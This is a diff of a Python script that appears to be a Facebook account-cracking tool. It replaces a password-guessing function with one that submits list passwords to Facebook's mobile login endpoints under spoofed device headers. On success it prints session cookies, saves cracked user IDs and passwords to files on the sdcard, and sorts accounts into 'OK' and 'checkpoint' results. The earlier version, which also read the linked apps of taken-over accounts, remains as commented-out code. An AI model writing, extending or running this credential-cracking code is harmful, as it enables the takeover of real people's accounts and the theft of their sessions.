@@ -783,105 +783,171 @@ def crack(idf,pwv):
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 
-
 def crackfree(idf, pwv):
-    global loop, ok, cp
-    sys.stdout.write(f"\r [SUPRAJ-XD] {loop}/{len(id)} OK[{ok}] [{'{:.0%}'.format(loop / float(len(id)))}]  ")
-    sys.stdout.flush()
-    
-    ua = random.choice(ugen)
-    ua2 = random.choice(ugen2)
-    ses = requests.Session()
-    
-    for pw in pwv:
-        try:
-            nip = random.choice(prox)
-            header_mbasic = {
-                'authority': 'mbasic.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'max-age=0',
-                'dpr': '1.5',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '"SM-G998B"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"9.0.0"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'none',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-                'viewport-width': '980',
-            }
-            
-            dataa = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-                "uid": idf,
-                "next": "https://p.facebook.com/login/save-device/",
-                "flow": "login_no_pin",
-                "pass": pw,
-            }
-            
-            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=header_mbasic, allow_redirects=False)
-            
-            if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r[CP] {idf} │ {pw}')
-                cek_apk(session, coki)
-                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf + ' • ' + pw + '\n')
-                cp += 1
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_mbasic = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=6zsqZlv1F0JB8lDS16pQzU8F; sb=6zsqZkMsyZHPfTG6lZlM84DW; m_pixel_ratio=1.5; wd=1067x480; fr=0A1pJjJlb27rVicOG..BmKjvr..AAA.0.0.BmKjwX.AWXnLXDbzI4; ps_n=1; ps_l=1',
+    'dpr': '1.5',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '"SM-G998B"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'pro',}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_mbasic).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[INNOCENT-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
+                cek_apk(session,coki)
+                open('/sdcard/INNOCENT-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
                 break
-            
-            elif "c_user" in ses.cookies.get_dict().keys():
-                ok += 1
-                coki = po.cookies.get_dict()
-                print(f'\r[OK] {idf} │ {pw}')
-                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf + ' • ' + pw + '\n')
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                if 'y' in cp_cpx: 
+                 print('\r\r\033[1;30m[INNOCENT-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/INNOCENT-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
                 break
-                
             else:
                 continue
-        
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-            continue
-        
-        except Exception as e:
-            print(f"An error occurred: {e}")
-            continue
-    
-    loop += 1
+        loop+=1
+        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mINNOCENT\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
 
-def cek_apk(session, coki):
-    try:
-        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
-        sop = BeautifulSoup(w, "html.parser")
-        x = sop.find("form", method="post")
-        game = [i.text for i in x.find_all("h3")]
-        if len(game) == 0:
-            print('\rNo Active Apk found')
-        else:
-            print('\rYour Active Application Details:')
-            for i in range(len(game)):
-                print(f"{i+1}. {game[i].replace('Ditambahkan pada', 'Ditambahkan pada')}")
-        
-        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
-        sop = BeautifulSoup(w, "html.parser")
-        x = sop.find("form", method="post")
-        game = [i.text for i in x.find_all("h3")]
-        if len(game) == 0:
-            print('\rNo Expired Apk found')
-        else:
-            print('\rYour Expired Application Details:')
-            for i in range(len(game)):
-                print(f"{i+1}. {game[i].replace('Kedaluwarsa', 'Kedaluwarsa')}")
+
+# def crackfree(idf, pwv):
+#     global loop, ok, cp
+#     sys.stdout.write(f"\r [SUPRAJ-XD] {loop}/{len(id)} OK[{ok}] [{'{:.0%}'.format(loop / float(len(id)))}]  ")
+#     sys.stdout.flush()
     
-    except Exception as e:
-        print(f"An error occurred while checking apps: {e}")
+#     ua = random.choice(ugen)
+#     ua2 = random.choice(ugen2)
+#     ses = requests.Session()
+    
+#     for pw in pwv:
+#         try:
+#             nip = random.choice(prox)
+#             header_mbasic = {
+#                 'authority': 'mbasic.facebook.com',
+#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+#                 'accept-language': 'en-US,en;q=0.9',
+#                 'cache-control': 'max-age=0',
+#                 'dpr': '1.5',
+#                 'sec-ch-prefers-color-scheme': 'dark',
+#                 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+#                 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+#                 'sec-ch-ua-mobile': '?0',
+#                 'sec-ch-ua-model': '"SM-G998B"',
+#                 'sec-ch-ua-platform': '"Android"',
+#                 'sec-ch-ua-platform-version': '"9.0.0"',
+#                 'sec-fetch-dest': 'document',
+#                 'sec-fetch-mode': 'navigate',
+#                 'sec-fetch-site': 'none',
+#                 'sec-fetch-user': '?1',
+#                 'upgrade-insecure-requests': '1',
+#                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+#                 'viewport-width': '980',
+#             }
+            
+#             dataa = {
+#                 "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+#                 "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+#                 "uid": idf,
+#                 "next": "https://p.facebook.com/login/save-device/",
+#                 "flow": "login_no_pin",
+#                 "pass": pw,
+#             }
+            
+#             po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=header_mbasic, allow_redirects=False)
+            
+#             if "checkpoint" in po.cookies.get_dict().keys():
+#                 print(f'\r[CP] {idf} │ {pw}')
+#                 cek_apk(session, coki)
+#                 open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf + ' • ' + pw + '\n')
+#                 cp += 1
+#                 break
+            
+#             elif "c_user" in ses.cookies.get_dict().keys():
+#                 ok += 1
+#                 coki = po.cookies.get_dict()
+#                 print(f'\r[OK] {idf} │ {pw}')
+#                 open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf + ' • ' + pw + '\n')
+#                 break
+                
+#             else:
+#                 continue
+        
+#         except requests.exceptions.ConnectionError:
+#             time.sleep(31)
+#             continue
+        
+#         except Exception as e:
+#             print(f"An error occurred: {e}")
+#             continue
+    
+#     loop += 1
+
+# def cek_apk(session, coki):
+#     try:
+#         w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+#         sop = BeautifulSoup(w, "html.parser")
+#         x = sop.find("form", method="post")
+#         game = [i.text for i in x.find_all("h3")]
+#         if len(game) == 0:
+#             print('\rNo Active Apk found')
+#         else:
+#             print('\rYour Active Application Details:')
+#             for i in range(len(game)):
+#                 print(f"{i+1}. {game[i].replace('Ditambahkan pada', 'Ditambahkan pada')}")
+        
+#         w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+#         sop = BeautifulSoup(w, "html.parser")
+#         x = sop.find("form", method="post")
+#         game = [i.text for i in x.find_all("h3")]
+#         if len(game) == 0:
+#             print('\rNo Expired Apk found')
+#         else:
+#             print('\rYour Expired Application Details:')
+#             for i in range(len(game)):
+#                 print(f"{i+1}. {game[i].replace('Kedaluwarsa', 'Kedaluwarsa')}")
+    
+#     except Exception as e:
+#         print(f"An error occurred while checking apps: {e}")
 
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
